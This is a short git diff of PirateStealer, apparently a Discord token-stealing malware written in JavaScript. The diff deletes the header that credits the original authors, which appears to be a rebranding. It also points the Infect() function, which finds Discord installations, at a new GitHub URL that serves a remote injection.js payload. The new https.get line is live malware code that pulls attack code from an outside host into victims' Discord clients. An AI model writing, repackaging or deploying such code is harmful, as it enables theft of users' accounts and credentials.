@@ -1,12 +1,3 @@
-// Thanks to https://github.com/mewzax who actually reuploaded the files (while it was deleted). You can file the old source code of PS at https://github.com/Mewzax/PirateStealer
-
-/* 
-    Creators: Stanley-GF & bytixo
-    Project Name: PirateStealer
-    Languages: JS, JS, RS (C# injectors can be found on Github)
-    Contribute: https://github.com/Stanley-GF/PirateStealer
-*/
-
 const glob = require("glob");
 const fs = require('fs');
 const https = require('https');
@@ -45,7 +36,7 @@ discords.forEach(function(file) {
 listDiscords();
 
 function Infect() {
-    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/injection/injection.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/kyssuuwuas/raar/main/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
